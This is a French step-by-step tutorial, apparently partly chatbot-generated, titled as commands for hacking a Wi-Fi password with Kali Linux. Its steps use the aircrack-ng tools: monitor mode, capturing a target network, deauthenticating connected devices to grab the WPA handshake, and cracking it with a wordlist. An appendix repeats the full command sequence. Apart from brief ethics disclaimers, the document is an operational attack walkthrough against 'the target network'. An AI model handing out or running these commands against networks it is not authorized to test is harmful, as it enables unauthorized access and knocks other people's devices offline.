### Tutoriel : Commandes pour Hacker un Mot de Passe Wi-Fi

#### Introduction
Ce tutoriel vous guidera à travers les étapes nécessaires pour utiliser Kali Linux pour pirater un mot de passe Wi-Fi. Il est important de noter que ce guide est destiné à des fins éducatives et éthiques seulement. Assurez-vous d'avoir l'autorisation appropriée avant de tester ces techniques sur un réseau.

#### Prérequis
- Kali Linux installé sur une machine virtuelle (VMware) ou directement sur un PC.
- Un adaptateur sans fil compatible avec l'injection de paquets (par exemple, Alfa AWUS036ACH).
- Connexion internet pour télécharger les outils nécessaires.

#### Étapes

1. **Démarrer Kali Linux et ouvrir la ligne de commande**
    - Ouvrez votre machine virtuelle ou votre PC avec Kali Linux installé.
    - Accédez à la ligne de commande.

2. **Vérifier la disponibilité de votre adaptateur sans fil**
    ```bash
    ifconfig
    ```
    - Vous devriez voir votre adaptateur sans fil répertorié (généralement sous `wlan0`).

3. **Activer le mode moniteur**
    ```bash
    airmon-ng start wlan0
    ```
    - Remplacez `wlan0` par l'interface correspondant à votre adaptateur sans fil.

4. **Lister les réseaux Wi-Fi disponibles**
    ```bash
    airodump-ng wlan0mon
    ```
    - Prenez note du BSSID et du canal (CH) du réseau cible.

5. **Capturer les paquets du réseau cible**
    ```bash
    airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
    ```
    - Remplacez `[channel]` par le canal du réseau cible.
    - Remplacez `[BSSID]` par le BSSID du réseau cible.
    - Remplacez `[output_file]` par le nom de fichier de sortie souhaité.

6. **Déauthentifier un appareil du réseau pour capturer le handshake**
    ```bash
    aireplay-ng --deauth 10 -a [BSSID] wlan0mon
    ```
    - Remplacez `[BSSID]` par le BSSID du réseau cible.
    - Cela forcera un appareil à se reconnecter, permettant de capturer le handshake.

7. **Vérifier la capture du handshake**
    ```bash
    aircrack-ng [output_file].cap
    ```
    - Remplacez `[output_file]` par le nom de fichier de sortie précédemment spécifié.

8. **Craquer le mot de passe avec un fichier de mots de passe**
    ```bash
    aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
    ```
    - Remplacez `[wordlist]` par le chemin vers votre fichier de mots de passe.
    - Remplacez `[BSSID]` par le BSSID du réseau cible.
    - Remplacez `[output_file]` par le nom de fichier de sortie.

#### Conclusion
En suivant ces étapes, vous pouvez tester la sécurité de votre propre réseau Wi-Fi. Rappelez-vous, utiliser ces techniques sans autorisation est illégal et contraire à l'éthique. Utilisez vos connaissances de manière responsable.

---
# Annexe

### Résumé des Commandes pour Pirater un Mot de Passe Wi-Fi

1. **Vérifier l'adaptateur sans fil**
   ```bash
   ifconfig
   ```

2. **Activer le mode moniteur**
   ```bash
   airmon-ng start wlan0
   ```

3. **Lister les réseaux Wi-Fi disponibles**
   ```bash
   airodump-ng wlan0mon
   ```

4. **Capturer les paquets du réseau cible**
   ```bash
   airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
   ```

5. **Déauthentifier un appareil du réseau**
   ```bash
   aireplay-ng --deauth 10 -a [BSSID] wlan0mon
   ```

6. **Vérifier la capture du handshake**
   ```bash
   aircrack-ng [output_file].cap
   ```

7. **Craquer le mot de passe avec un fichier de mots de passe**
   ```bash
   aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
   ```

Remplacez les termes entre crochets `[ ]` par les valeurs appropriées :
- `[channel]` : Canal du réseau cible.
- `[BSSID]` : BSSID du réseau cible.
- `[output_file]` : Nom du fichier de sortie pour la capture des paquets.
- `[wordlist]` : Chemin vers votre fichier de mots de passe.

---
#### Références supplémentaires
- [Configurer votre nouvel adaptateur sans fil](https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57)
- https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57
- [Vidéo YouTube sur le piratage Wi-Fi](https://www.youtube.com/watch?v=bzCAMWP1G1U)

Pour toute question ou besoin de clarification supplémentaire, n'hésitez pas à demander!



# Références : 
- https://www.aircrack-ng.org/doku.php?id=fr:simple_wep_crack
- https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57
- https://www.youtube.com/watch?v=qCPfXK13UD4&ab_channel=UpgradeSecurity

